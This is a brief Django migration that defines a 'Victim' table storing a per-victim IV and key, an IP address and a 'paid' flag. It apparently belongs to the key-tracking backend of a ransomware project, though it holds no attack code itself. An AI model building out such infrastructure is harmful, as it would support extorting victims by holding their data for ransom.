# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Victim',
            fields=[
                ('id', models.CharField(primary_key=True, max_length=20, serialize=False)),
                ('iv', models.CharField(max_length=16)),
                ('key', models.CharField(max_length=32)),
                ('ip', models.CharField(max_length=16, blank=True, null=True)),
                ('paid', models.BooleanField()),
                ('create_time', models.DateTimeField(editable=False)),
                ('update_time', models.DateTimeField()),
            ],
        ),
    ]
